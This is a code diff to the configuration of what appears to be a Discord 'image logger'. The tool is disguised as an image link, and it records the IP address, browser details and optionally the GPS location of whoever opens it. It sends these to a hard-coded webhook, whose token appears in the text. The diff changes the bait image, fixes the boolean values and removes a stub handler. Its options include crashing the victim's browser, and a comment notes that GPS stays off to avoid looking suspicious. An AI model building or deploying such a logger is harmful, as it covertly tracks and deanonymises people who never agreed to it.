@@ -13,18 +13,18 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1462933471163842703/Iv05gJFbFE39pnKIRAINN61YiYgSFotnM_3t-yBVJm2jjKb4_5K1KFcmKkteaQ6US8PU",
-    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/9/96/Meme_Man_on_transparent_background.webp/250px-Meme_Man_on_transparent_background.webp.png", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "snatch blue", # Set this to the name you want the webhook to have
-    "color": 0x2dfffe, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": false, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": false, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=XEFZ30Cvdnc" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -86,14 +86,6 @@ def reportError(error):
         }
     ],
 })
-
-def handler(request):
-    return {
-        "statusCode": 200,
-        "headers": {"Content-Type": "text/plain"},
-        "body": "Hello from Vercel Python"
-    }
-
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
